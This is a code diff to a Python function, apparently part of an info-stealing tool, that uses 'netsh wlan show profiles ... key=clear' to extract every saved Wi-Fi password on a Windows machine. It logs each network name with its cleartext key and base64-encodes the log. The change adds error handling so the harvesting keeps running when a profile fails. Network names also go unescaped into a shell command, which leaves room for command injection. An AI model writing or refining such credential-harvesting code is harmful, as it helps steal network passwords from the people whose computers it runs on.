@@ -36,15 +36,18 @@ def fetch_info(path):
                 pattern="(?:Profile\s*:\s)(.*)", string=networks.stdout)
 
             for net in network_names:
-                command = 'netsh wlan show profiles name= "' + net + '" key=clear'
-                key = subprocess.run(
-                    command, capture_output=True, text=True, shell=True)
-                out_key = re.search(
-                    pattern="(?:Key Content\s*:\s)(.*)", string=key.stdout)
-                log += "\nWiFi ID = "+net+" | Password = "+out_key.group(1)
+                try:
+                    command = 'netsh wlan show profiles name= "' + net + '" key=clear'
+                    key = subprocess.run(
+                        command, capture_output=True, text=True, shell=True)
+                    out_key = re.search(
+                        pattern="(?:Key Content\s*:\s)(.*)", string=key.stdout)
+                    log += "\nWiFi ID = "+net+" | Password = "+out_key.group(1)
+                except Exception:
+                    log+=f'\nError extracting info for [{net}]'
 
         except Exception:
-            log += "WiFi Info not available"
+            log += "\nWiFi Info not available"
 
         log += '\n\n\n'
         log = base64.b64encode(log.encode()).decode()
